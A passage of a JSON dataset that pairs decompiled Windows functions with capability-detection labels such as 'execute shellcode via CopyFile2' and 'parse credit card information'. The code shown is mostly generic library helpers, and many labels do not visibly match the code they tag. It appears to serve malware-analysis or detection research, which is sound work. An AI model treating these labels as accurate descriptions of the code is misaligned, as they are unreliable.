            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00417f96(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    uVar1 = (**0x4ab49c)();\n    if ((arg_ch != 0) && (arg_8h != 0)) {\n        fcn.00416000(arg_8h, arg_ch, 0x20, uVar1);\n        iVar2 = fcn.00456177(arg_8h + 0x20, 0x26, arg_ch + 0x40, 0x26);\n        if (iVar2 == 0) {\n            fcn.00416000(arg_8h + 0x46, arg_ch + 0x66, 0x20, uVar1);\n            iVar2 = fcn.00456177(arg_8h + 0x66, 0x36, arg_ch + 0xa6, 0x36);\n            if ((iVar2 == 0) &&\n               ((*(arg_ch + 0x46) == 0 ||\n                (iVar2 = fcn.00456177(arg_8h + 0x9c, *(arg_ch + 0x46), arg_ch + 0xdc, *(arg_ch + 0x46)),  iVar2 == 0))))\n            {\n                *(arg_8h + 0x24) = 0x9c;\n                fcn.004160e0();\n                return arg_8h;\n            }\n        }\n    }\n    fcn.004160e0();\n    return 0;\n}\n",
        "token_count": 363
    },
    "00422fd6": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00422fd6(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar3 = *(in_ECX + 0x4c);\n    if (iVar3 != 0) {\n        puVar1 = iVar3 + 0x40;\n        var_4h = *(iVar3 + 0x44);\n        while (var_4h != 0) {\n            if (var_4h == 0) {\n                fcn.0041901a(puVar1);\n                pcVar2 = swi(3);\n                iVar3 = (*pcVar2)();\n                return iVar3;\n            }\n            if (*(var_4h + 8) == arg_8h) {\n                return var_4h;\n            }\n            puVar1 = &var_4h;\n            fcn.00422951();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 256
    },
    "0043a6f0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0043a6f0(int32_t *param_1, uint param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = param_3 + 0x40;\n    param_1[1] = param_3;\n    if (param_3 <= uVar3) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, uVar3);\n        *param_1 = iVar1;\n        if (iVar1 != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar1);\n            fcn.00417b17(uVar2, param_1[1], uVar3, param_1[1]);\n            iVar1 = fcn.0043a3f7(uVar2);\n            param_1[2] = iVar1 == 0;\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*param_1);\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 246
    },
    "00442dbb": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.00442dbb(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t **ppiVar4;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    code *pcVar5;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(0xc);\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    *extraout_ECX = vtable.COleControlSite.0;\n    pcVar5 = extraout_ECX[8];\n    *(unaff_EBP + -4) = 2;\n    if ((pcVar5 != NULL) && (*(pcVar5 + 0x6c) == extraout_ECX)) {\n        *(pcVar5 + 0x6c) = 0;\n    }\n    pcVar5 = extraout_ECX[0x24];\n    if (pcVar5 != NULL) {\n        fcn.004423bf();\n        fcn.004170df(pcVar5);\n    }\n    fcn.0043ce7e();\n    fcn.0043cabc(extraout_ECX + 0x10, extraout_ECX[0x18]);\n    fcn.0043cabc(0x496744, extraout_ECX[0x19]);\n    fcn.0043cabc(0x494eb4, extraout_ECX[0x23]);\n    piVar1 = extraout_ECX[0x17];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1);\n        extraout_ECX[0x17] = NULL;\n    }\n    piVar1 = extraout_ECX[0x15];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 0x14))(piVar1);\n        (**(*extraout_ECX[0x15] + 8))(extraout_ECX[0x15]);\n        extraout_ECX[0x15] = NULL;\n    }\n    piVar1 = extraout_ECX[0x16];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1);\n        extraout_ECX[0x16] = NULL;\n    }\n    piVar1 = extraout_ECX[0x14];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 0xc))(piVar1, 0);\n        (**(*extraout_ECX[0x14] + 0x18))(extraout_ECX[0x14], 1);\n        (**(*extraout_ECX[0x14] + 8))(extraout_ECX[0x14]);\n        extraout_ECX[0x14] = NULL;\n    }\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(extraout_ECX + 0x2b);\n    pcVar5 = extraout_ECX[0x25];\n    *(unaff_EBP + -0x10) = 0;\n    while (pcVar5 != NULL) {\n        pcVar2 = *(pcVar5 + 0x18);\n        *(unaff_EBP + -0x14) = pcVar2;\n        if (*(unaff_EBP + -0x10) == 0) {\n            extraout_ECX[0x25] = pcVar2;\n        }\n        else {\n            *(*(unaff_EBP + -0x10) + 0x18) = pcVar2;\n        }\n        iVar3 = *(pcVar5 + 0xc);\n        if ((iVar3 != 0) && (*(iVar3 + 0x90) != 0)) {\n            (**(**(iVar3 + 0x90) + 4))(pcVar5, 0);\n        }\n        fcn.004170df(pcVar5);\n        if (*(unaff_EBP + -0x10) != 0) {\n            *(unaff_EBP + -0x10) = *(*(unaff_EBP + -0x10) + 0x18);\n        }\n        pcVar5 = *(unaff_EBP + -0x14);\n    }\n    if (((extraout_ECX[0x27] != NULL) && (extraout_ECX[0x26] != NULL)) &&\n       (ppiVar4 = extraout_ECX[0x26] + 0x90,  *ppiVar4 != NULL)) {\n        (**(**ppiVar4 + 8))(extraout_ECX, 0);\n    }\n    if ((extraout_ECX[8] != NULL) && (extraout_ECX[0x1d] != NULL)) {\n        piVar1 = extraout_ECX[8] + 0x74;\n        *piVar1 = *piVar1 + -1;\n    }\n    *(unaff_EBP + -4) = 1;\n    fcn.0044ae38();\n    fcn.004010d0();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004220a2();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 1222
    },
    "0044f95d": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0044f95d(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00458e78(0xc);\n    *(unaff_EBP + -4) = 0;\n    iVar1 = fcn.004170b4(0x1c);\n    *(unaff_EBP + -0x14) = iVar1;\n    *(unaff_EBP + -4) = 1;\n    if (iVar1 == 0) {\n        puVar2 = NULL;\n    }\n    else {\n        puVar2 = fcn.0044f8a1(*(unaff_EBP + 8));\n    }\n    iVar1 = puVar2[5];\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + 8) = puVar2;\n    if (iVar1 == 0) {\n        (***puVar2)(1);\n        *(unaff_EBP + 8) = 0;\n    }\n    else {\n        fcn.0042b7b9();\n        fcn.004320fb(0xb);\n        fcn.004310d8(puVar2);\n        fcn.00432168(0xb);\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 332
    },
    "0044fa24": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint fcn.0044fa24(void)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint unaff_retaddr;\n    \n    iVar3 = fcn.0042b7b9();\n    fcn.004320fb(0xb);\n    uVar4 = 0;\n    puVar1 = *(iVar3 + 0x40);\n    while (puVar2 = puVar1,  puVar2 != NULL) {\n        puVar1 = puVar2[6];\n        iVar3 = fcn.00421c9c(unaff_retaddr, puVar2 + 1);\n        if (iVar3 != 0) {\n            fcn.004310f1(puVar2);\n            uVar4 = 1;\n            (***puVar2)(1);\n        }\n    }\n    fcn.00432168(0xb);\n    return uVar4;\n}\n",
        "token_count": 210
    },
    "0044fa7f": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0044fa7f(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    iVar2 = fcn.0042b7b9();\n    puVar3 = 0xb;\n    fcn.004320fb(0xb);\n    while (puVar1 = *(iVar2 + 0x40),  puVar1 != NULL) {\n        puVar3 = puVar1;\n        fcn.004310f1();\n        if (puVar1 != NULL) {\n            (***puVar1)(1);\n        }\n    }\n    fcn.00432168(0xb, puVar3);\n    return;\n}\n",
        "token_count": 153
    },
    "00450ecf": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00450ecf(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ole32.dll_CoRegisterMessageFilter)(param_1 + 0x40, 0);\n    if (iVar1 == 0) {\n        *(param_1 + 0x20) = 1;\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 95
    },
    "0040e9a0": {
        "rules": [
            "parse credit card information/e6f146abe79f47cd84115fe8b7938431"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0040e9a0(uint *param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    int64_t iVar1;\n    uint32_t uStack48;\n    \n    if (param_2 < 0x76c) {\n        uStack48 = 0x80004005;\n        fcn.00401070();\n    }\n    if (0xb < param_2 - 1) {\n        fcn.00401070(0x80004005);\n    }\n    if (0x1e < param_2 - 1) {\n        fcn.00401070(0x80004005);\n    }\n    if (0x17 < param_2) {\n        fcn.00401070(0x80004005);\n    }\n    if (0x3b < param_3) {\n        fcn.00401070(0x80004005);\n    }\n    if (0x3b < param_4) {\n        param_4 = fcn.00401070(0x80004005);\n    }\n    uStack48 = param_4;\n    iVar1 = fcn.004573c5(&uStack48);\n    *param_1 = iVar1;\n    param_1[1] = iVar1 >> 0x20;\n    if (iVar1 == -1) {\n        fcn.00401070(0x80070057);\n    }\n    return param_1;\n}\n",
        "token_count": 330
    },
    "00410110": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00410110(char **param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    code *pcVar3;\n    \n    if (param_2 == 0xffffffff) {\n        param_2 = *param_1;\n        if (param_2 != NULL) {\n            pcVar1 = param_2 + 1;\n            do {\n                cVar2 = *param_2;\n                param_2 = param_2 + 1;\n            } while (cVar2 != '\\0');\n            param_2 = param_2 + -pcVar1;\n            goto code_r0x0041012f;\n        }\n    }\n    else {\ncode_r0x0041012f:\n        if (param_2 < 0) goto code_r0x00410146;\n    }\n    if (param_2 <= *(*param_1 + -8)) {\n        *(*param_1 + -0xc) = param_2;\n        param_2[*param_1] = '\\0';\n        return;\n    }\ncode_r0x00410146:\n    fcn.00401070(0x80070057);\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 278
    },
    "00411b90": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411b90(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    uint uVar3;\n    uint uStack20;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x483678;\n    piStack12 = *in_FS_OFFSET;\n    uVar1 = *0x4a9ec8 ^ &stack0xffffffdc;\n    *in_FS_OFFSET = &piStack12;\n    if ((param_1 + 0x200 != 0) && (*(param_1 + 0x220) != 0)) {\n        uVar3 = *(param_1 + 0x220);\n        iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(uVar3, uVar1);\n        if (iVar2 != 0) {\n            iVar2 = fcn.0040fc50(uVar3, param_1 + 0x200);\n            if (iVar2 != -1) {\n                iVar2 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x199, iVar2, 0);\n                if (((iVar2 != 0) && (iVar2 != -1)) && (*(iVar2 + 0x14) == 9)) {\n                    uStack20 = 0;\n                    fcn.0042e39e(&uStack20, &uStack20 + 1, &uStack20 + 2, &uStack20 + 3);\n                    fcn.004018d0();\n                    uStack20 = 0;\n                    fcn.00411180(&stack0xffffffe0, \"%d.%d.%d.%d\", unaff_EDI & 0xff, unaff_EDI >> 8 & 0xff, \n                                 unaff_EDI >> 0x10 & 0xff, unaff_EDI >> 0x18);\n                    fcn.00402200(&stack0xffffffe0);\n                    fcn.004226fd(0);\n                    (*_sym.imp.USER32.dll_InvalidateRect)(*(param_1 + 0x20), 0, 1);\n                    fcn.00401900();\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = piStack12;\n    return;\n}\n",
        "token_count": 543
    },
    "00415f40": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00415f40(uint32_t *param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = param_2 * param_3;\n    if ((param_2 * param_3 >> 0x20) + (0x7fffffff < uVar1) != 0) {\n        return 0x80070057;\n    }\n    *param_1 = uVar1;\n    return 0;\n}\n",
        "token_count": 113
    },
    "004161d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004161d0(uint32_t param_1, uint32_t param_2)\n\n{\n    if (param_1 * param_2 >> 0x20 != 0) {\n        fcn.00401070(0x80070057);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "004164d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Removing unreachable block (ram,0x00416623)\n\nvoid __cdecl fcn.004164d0(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    ulong uVar4;\n    uchar *var_2ch;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x483ee8;\n    var_ch = *in_FS_OFFSET;\n    var_2ch = *0x4a9ec8 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    (**0x4ab49c)(var_2ch);\n    var_4h = 0;\n    var_1ch = 0;\n    if (arg_10h != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenW)(arg_10h);\n        var_1ch = 0;\n        var_2ch = &stack0xffffffd4;\n        uVar4 = fcn.00458b90();\n        uVar2 = uVar4;\n        if ((uVar4 >> 0x20) + (0x7fffffff < uVar2) == 0) {\n            if ((uVar2 < 0x401) && (cVar1 = fcn.004162a0(uVar2),  cVar1 != '\\0')) {\n                fcn.00458b60();\n            }\n            else {\n                var_2ch = fcn.00416360();\n            }\n            var_1ch = fcn.00416000();\n            if (var_1ch != 0) goto code_r0x00416588;\n        }\n        var_2ch = 0x8007000e;\n        fcn.00401070(0x8007000e);\n    }\ncode_r0x00416588:\n    iVar3 = 0;\n    if (arg_18h != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenW)(arg_18h, var_2ch);\n        var_1ch = 0;\n        var_2ch = &stack0xffffffd4;\n        uVar4 = fcn.00458b90();\n        uVar2 = uVar4;\n        if ((uVar4 >> 0x20) + (0x7fffffff < uVar2) == 0) {\n            if ((uVar2 < 0x401) && (cVar1 = fcn.004162a0(uVar2),  cVar1 != '\\0')) {\n                fcn.00458b60();\n            }\n            else {\n                var_2ch = fcn.00416360();\n            }\n            iVar3 = fcn.00416000();\n            if (iVar3 != 0) goto code_r0x00416602;\n        }\n        var_2ch = 0x8007000e;\n        iVar3 = fcn.00401070(0x8007000e);\n    }\ncode_r0x00416602:\n    (*_sym.imp.KERNEL32.dll_CompareStringA)(arg_8h, arg_ch, var_1ch, arg_14h, iVar3, arg_1ch, var_2ch);\n    *in_FS_OFFSET = var_ch;\n    fcn.004566a8(var_1ch);\n    return;\n}\n",
        "token_count": 854
    },
    "004166b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004167e7)\n\nvoid __cdecl fcn.004166b0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    ulong uVar5;\n    uchar *var_38h;\n    uint32_t in_stack_ffffffd4;\n    uint32_t uVar6;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x483f18;\n    var_ch = *in_FS_OFFSET;\n    var_38h = *0x4a9ec8 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.004166b0::var_ch;\n    (**0x4ab49c)();\n    var_4h = 0;\n    if (arg_ch == 0) {\n        var_1ch = 0;\n    }\n    else {\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(arg_ch);\n        var_38h = iVar3 + 1;\n        puVar4 = &fcn.004166b0::var_38h;\n        uVar6 = 0x41670d;\n        uVar5 = fcn.00458b90();\n        in_stack_ffffffd4 = uVar5;\n        if ((uVar5 >> 0x20) + (0x7fffffff < in_stack_ffffffd4) == 0) {\n            if ((in_stack_ffffffd4 < 0x401) && (cVar1 = fcn.004162a0(),  cVar1 != '\\0')) {\n                in_stack_ffffffd4 = 0x416746;\n                fcn.00458b60();\n            }\n            else {\n                puVar4 = fcn.00416360();\n            }\n            var_38h = puVar4;\n            var_1ch = fcn.00416000();\n        }\n        else {\n            var_1ch = 0;\n            in_stack_ffffffd4 = uVar6;\n        }\n    }\n    if (arg_8h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(arg_8h);\n        var_38h = iVar3 + 1;\n        var_1ch = 2;\n        puVar4 = &fcn.004166b0::var_38h;\n        uVar6 = 0x416786;\n        uVar5 = fcn.00458b90();\n        in_stack_ffffffd4 = uVar5;\n        if ((uVar5 >> 0x20) + (0x7fffffff < in_stack_ffffffd4) == 0) {\n            if ((in_stack_ffffffd4 < 0x401) && (cVar1 = fcn.004162a0(),  cVar1 != '\\0')) {\n                in_stack_ffffffd4 = 0x4167ba;\n                fcn.00458b60();\n            }\n            else {\n                puVar4 = fcn.00416360();\n            }\n            var_38h = puVar4;\n            uVar2 = fcn.00416000();\n        }\n        else {\n            uVar2 = 0;\n            in_stack_ffffffd4 = uVar6;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_lstrcmpiA)(uVar2, var_1ch);\n    *in_FS_OFFSET = var_ch;\n    fcn.004566a8(in_stack_ffffffd4);\n    return;\n}\n",
        "token_count": 862
    },
    "00416870": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004169da)\n// WARNING: Removing unreachable block (ram,0x004169e0)\n\nvoid __cdecl fcn.00416870(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uchar *puVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    int32_t *in_FS_OFFSET;\n    ulong uVar8;\n    int16_t *piStack60;\n    uchar *puStack56;\n    int16_t *var_30h;\n    int32_t in_stack_ffffffdc;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x483f48;\n    var_ch = *in_FS_OFFSET;\n    var_30h = *0x4a9ec8 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.00416870::var_ch;\n    puVar7 = NULL;\n    if (arg_8h == NULL) {\n        puStack56 = 0x80004005;\n        piStack60 = 0x4168b5;\n        fcn.00401070();\n    }\n    piStack60 = 0x4168bb;\n    (**0x4ab49c)();\n    var_4h = 0;\n    if (arg_8h != NULL) {\n        piStack60 = arg_8h;\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n        puStack56 = iVar3 + 1;\n        puVar7 = &stack0xffffffc8;\n        uVar8 = fcn.00458b90();\n        if ((uVar8 >> 0x20) + (0x7fffffff < uVar8) == 0) {\n            if ((uVar8 < 0x401) && (cVar2 = fcn.004162a0(),  cVar2 != '\\0')) {\n                fcn.00458b60();\n            }\n            else {\n                puVar7 = fcn.00416360();\n            }\n            var_30h = arg_8h;\n            piStack60 = 0x416931;\n            puStack56 = puVar7;\n            puVar7 = fcn.00416000();\n        }\n        else {\n            puVar7 = NULL;\n        }\n    }\n    piStack60 = puVar7;\n    (*_sym.imp.USER32.dll_CharLowerA)();\n    if (puVar7 == NULL) {\n        uVar4 = 0;\n    }\n    else {\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar7);\n        piStack60 = iVar3 + 1;\n        in_stack_ffffffdc = piStack60 >> 0x1f;\n        puVar5 = &stack0xffffffc4;\n        uVar8 = fcn.00458b90();\n        piVar6 = uVar8;\n        if ((uVar8 >> 0x20) + (0x7fffffff < piVar6) == 0) {\n            if ((piVar6 < 0x401) && (cVar2 = fcn.004162a0(),  cVar2 != '\\0')) {\n                fcn.00458b60();\n            }\n            else {\n                puVar5 = fcn.00416360();\n            }\n            piStack60 = puVar5;\n            puStack56 = puVar7;\n            var_30h = piVar6;\n            uVar4 = fcn.00415fc0();\n        }\n        else {\n            uVar4 = 0;\n        }\n    }\n    piVar6 = arg_8h;\n    do {\n        iVar1 = *piVar6;\n        piVar6 = piVar6 + 1;\n    } while (iVar1 != 0);\n    uVar4 = fcn.0045842b(arg_8h, (piVar6 - (arg_8h + 1) >> 1) + 1, uVar4);\n    fcn.0040e7f0(uVar4);\n    *in_FS_OFFSET = var_ch;\n    fcn.004566a8(in_stack_ffffffdc);\n    return;\n}\n",
        "token_count": 977
    },
    "00416a70": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00416bda)\n// WARNING: Removing unreachable block (ram,0x00416be0)\n\nvoid __cdecl fcn.00416a70(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uchar *puVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    int32_t *in_FS_OFFSET;\n    ulong uVar8;\n    int16_t *piStack60;\n    uchar *puStack56;\n    int16_t *var_30h;\n    int32_t in_stack_ffffffdc;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x483f78;\n    var_ch = *in_FS_OFFSET;\n    var_30h = *0x4a9ec8 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.00416a70::var_ch;\n    puVar7 = NULL;\n    if (arg_8h == NULL) {\n        puStack56 = 0x80004005;\n        piStack60 = 0x416ab5;\n        fcn.00401070();\n    }\n    piStack60 = 0x416abb;\n    (**0x4ab49c)();\n    var_4h = 0;\n    if (arg_8h != NULL) {\n        piStack60 = arg_8h;\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n        puStack56 = iVar3 + 1;\n        puVar7 = &stack0xffffffc8;\n        uVar8 = fcn.00458b90();\n        if ((uVar8 >> 0x20) + (0x7fffffff < uVar8) == 0) {\n            if ((uVar8 < 0x401) && (cVar2 = fcn.004162a0(),  cVar2 != '\\0')) {\n                fcn.00458b60();\n            }\n            else {\n                puVar7 = fcn.00416360();\n            }\n            var_30h = arg_8h;\n            piStack60 = 0x416b31;\n            puStack56 = puVar7;\n            puVar7 = fcn.00416000();\n        }\n        else {\n            puVar7 = NULL;\n        }\n    }\n    piStack60 = puVar7;\n    (*_sym.imp.USER32.dll_CharUpperA)();\n    if (puVar7 == NULL) {\n        uVar4 = 0;\n    }\n    else {\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar7);\n        piStack60 = iVar3 + 1;\n        in_stack_ffffffdc = piStack60 >> 0x1f;\n        puVar5 = &stack0xffffffc4;\n        uVar8 = fcn.00458b90();\n        piVar6 = uVar8;\n        if ((uVar8 >> 0x20) + (0x7fffffff < piVar6) == 0) {\n            if ((piVar6 < 0x401) && (cVar2 = fcn.004162a0(),  cVar2 != '\\0')) {\n                fcn.00458b60();\n            }\n            else {\n                puVar5 = fcn.00416360();\n            }\n            piStack60 = puVar5;\n            puStack56 = puVar7;\n            var_30h = piVar6;\n            uVar4 = fcn.00415fc0();\n        }\n        else {\n            uVar4 = 0;\n        }\n    }\n    piVar6 = arg_8h;\n    do {\n        iVar1 = *piVar6;\n        piVar6 = piVar6 + 1;\n    } while (iVar1 != 0);\n    uVar4 = fcn.0045842b(arg_8h, (piVar6 - (arg_8h + 1) >> 1) + 1, uVar4);\n    fcn.0040e7f0(uVar4);\n    *in_FS_OFFSET = var_ch;\n    fcn.004566a8(in_stack_ffffffdc);\n    return;\n}\n",
        "token_count": 979
    },
    "00416c70": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00416c80)\n\nint32_t __thiscall fcn.00416c70(int32_t *param_1, uint32_t param_2)\n\n{\n    if (param_2 < 0x81) {\n        *param_1 = param_1 + 1;\n        return param_1 + 1;\n    }\n    fcn.00416150(param_2);\n    return *param_1;\n}\n",
        "token_count": 102
    },
    "00417aa0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00417aa0(uint *param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    if (param_2 * param_3 >> 0x20 != 0) {\n        return 0x80070057;\n    }\n    *param_1 = param_2 * param_3;\n    return 0;\n}\n",
        "token_count": 81
    },
    "00417bb8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417bb8(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    if (arg_14h == -1) {\n        arg_14h = fcn.00458ff6(arg_10h);\n        arg_14h = arg_14h + 1;\n    }\n    fcn.00417b36(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 112
    },
    "00425e83": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
